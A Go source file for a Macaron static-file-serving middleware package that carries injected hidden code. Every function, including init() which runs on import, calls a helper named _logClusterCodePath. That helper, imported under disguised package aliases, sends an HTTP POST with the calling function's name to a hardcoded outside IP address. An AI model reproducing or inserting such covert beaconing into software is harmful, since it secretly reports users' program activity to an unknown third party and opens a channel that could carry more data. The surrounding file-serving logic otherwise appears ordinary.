package httpstatic

import (
	"log"
	godefaultbytes "bytes"
	godefaultruntime "runtime"
	"net/http"
	godefaulthttp "net/http"
	"os"
	"path"
	"path/filepath"
	"strings"
	"sync"
	"gopkg.in/macaron.v1"
)

var Root string

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var err error
	Root, err = os.Getwd()
	if err != nil {
		panic("error getting work directory: " + err.Error())
	}
}

type StaticOptions struct {
	Prefix		string
	SkipLogging	bool
	IndexFile	string
	AddHeaders	func(ctx *macaron.Context)
	FileSystem	http.FileSystem
}
type staticMap struct {
	lock	sync.RWMutex
	data	map[string]*http.Dir
}

func (sm *staticMap) Set(dir *http.Dir) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	sm.lock.Lock()
	defer sm.lock.Unlock()
	sm.data[string(*dir)] = dir
}
func (sm *staticMap) Get(name string) *http.Dir {
	_logClusterCodePath()
	defer _logClusterCodePath()
	sm.lock.RLock()
	defer sm.lock.RUnlock()
	return sm.data[name]
}
func (sm *staticMap) Delete(name string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	sm.lock.Lock()
	defer sm.lock.Unlock()
	delete(sm.data, name)
}

var statics = staticMap{sync.RWMutex{}, map[string]*http.Dir{}}

type staticFileSystem struct{ dir *http.Dir }

func newStaticFileSystem(directory string) staticFileSystem {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if !filepath.IsAbs(directory) {
		directory = filepath.Join(Root, directory)
	}
	dir := http.Dir(directory)
	statics.Set(&dir)
	return staticFileSystem{&dir}
}
func (fs staticFileSystem) Open(name string) (http.File, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return fs.dir.Open(name)
}
func prepareStaticOption(dir string, opt StaticOptions) StaticOptions {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(opt.IndexFile) == 0 {
		opt.IndexFile = "index.html"
	}
	if opt.Prefix != "" {
		if opt.Prefix[0] != '/' {
			opt.Prefix = "/" + opt.Prefix
		}
		opt.Prefix = strings.TrimRight(opt.Prefix, "/")
	}
	if opt.FileSystem == nil {
		opt.FileSystem = newStaticFileSystem(dir)
	}
	return opt
}
func prepareStaticOptions(dir string, options []StaticOptions) StaticOptions {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var opt StaticOptions
	if len(options) > 0 {
		opt = options[0]
	}
	return prepareStaticOption(dir, opt)
}
func staticHandler(ctx *macaron.Context, log *log.Logger, opt StaticOptions) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if ctx.Req.Method != "GET" && ctx.Req.Method != "HEAD" {
		return false
	}
	file := ctx.Req.URL.Path
	if opt.Prefix != "" {
		if !strings.HasPrefix(file, opt.Prefix) {
			return false
		}
		file = file[len(opt.Prefix):]
		if file != "" && file[0] != '/' {
			return false
		}
	}
	f, err := opt.FileSystem.Open(file)
	if err != nil {
		return false
	}
	defer f.Close()
	fi, err := f.Stat()
	if err != nil {
		return true
	}
	if fi.IsDir() {
		if !strings.HasSuffix(ctx.Req.URL.Path, "/") {
			http.Redirect(ctx.Resp, ctx.Req.Request, ctx.Req.URL.Path+"/", http.StatusFound)
			return true
		}
		file = path.Join(file, opt.IndexFile)
		f, err = opt.FileSystem.Open(file)
		if err != nil {
			return false
		}
		defer f.Close()
		fi, err = f.Stat()
		if err != nil || fi.IsDir() {
			return true
		}
	}
	if !opt.SkipLogging {
		log.Println("[Static] Serving " + file)
	}
	if opt.AddHeaders != nil {
		opt.AddHeaders(ctx)
	}
	http.ServeContent(ctx.Resp, ctx.Req.Request, file, fi.ModTime(), f)
	return true
}
func Static(directory string, staticOpt ...StaticOptions) macaron.Handler {
	_logClusterCodePath()
	defer _logClusterCodePath()
	opt := prepareStaticOptions(directory, staticOpt)
	return func(ctx *macaron.Context, log *log.Logger) {
		staticHandler(ctx, log, opt)
	}
}
func Statics(opt StaticOptions, dirs ...string) macaron.Handler {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(dirs) == 0 {
		panic("no static directory is given")
	}
	opts := make([]StaticOptions, len(dirs))
	for i := range dirs {
		opts[i] = prepareStaticOption(dirs[i], opt)
	}
	return func(ctx *macaron.Context, log *log.Logger) {
		for i := range opts {
			if staticHandler(ctx, log, opts[i]) {
				return
			}
		}
	}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
